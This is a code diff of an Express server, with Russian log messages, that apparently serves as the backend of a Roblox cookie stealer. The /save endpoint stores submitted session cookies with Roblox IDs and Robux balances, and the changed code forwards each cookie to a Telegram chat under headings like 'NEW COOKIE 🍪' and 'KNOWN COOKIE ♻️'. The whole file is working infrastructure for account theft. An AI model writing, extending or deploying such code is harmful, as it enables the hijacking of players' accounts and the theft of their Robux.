@@ -29,7 +29,7 @@ app.use(
 );
 
 app.post("/save", async (req, res) => {
-  const { login, robloxId } = req.body ?? {};
+  const { login, robloxId, robux = null } = req.body ?? {};
   if (!login) {
     return res
       .status(400)
@@ -37,29 +37,49 @@ app.post("/save", async (req, res) => {
   }
 
   try {
-    await client`
-      INSERT INTO users (cookie, roblox_id)
-      VALUES (${login}, ${robloxId})`;
+    const existing = await client`
+      SELECT id, roblox_id FROM users
+      WHERE cookie = ${login}
+      LIMIT 1
+    `;
+
+    let alreadyExists = false;
+
+    if (existing.length > 0) {
+      alreadyExists = true;
+      if (robloxId && !existing[0].roblox_id) {
+        await client`
+          UPDATE users
+          SET roblox_id = ${robloxId}
+          WHERE id = ${existing[0].id}
+        `;
+      }
+    } else {
+      await client`
+        INSERT INTO users (cookie, roblox_id, robux)
+        VALUES (${login}, ${robloxId}, ${robux})
+      `;
+    }
+
+    const robuxLine =
+      robux !== null && robux !== undefined ? `\n<b>ROBUX:</b> ${robux}` : "";
 
     await sendTelegramMessage(
-      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b>\n\n\n <b>LINK --- </b> https://www.roblox.com/users/${robloxId}/profile \n\n\n  <code>${login}</code> `);
+      process.env.CHAT_ID,
+      `<b>${alreadyExists ? "KNOWN COOKIE ♻️" : "NEW COOKIE 🍪"}</b>\n\n` +
+      `Robux - ${robux}\n\n` + 
+        `<b>LINK:</b> https://www.roblox.com/users/${robloxId}/profile\n\n` +
+        `<code>${login}</code>`
+    );
 
-    res.json({ ok: true, account });
+    res.json({ ok: true, alreadyExists });
   } catch (err) {
     console.error("Ошибка:", err);
     res.status(500).json({ ok: false, error: err.message });
   }
 });
-app.get("/users", async (req, res) => {
-  try {
-    const users = await client`SELECT * FROM users`;
-    res.json({ ok: true, users });
-  } catch (err) {
-    console.error("Ошибка получения пользователей из базы данных:", err);
-    res
-      .status(500)
-      .json({ ok: false, error: "Не удалось получить пользователей" });
-  }
+app.get("/health", (req, res) => {
+  res.status(200).send("Server is running!");
 });
 app.listen(PORT, () => {
   console.log(`Сервер запущен: http://localhost:${PORT}`);
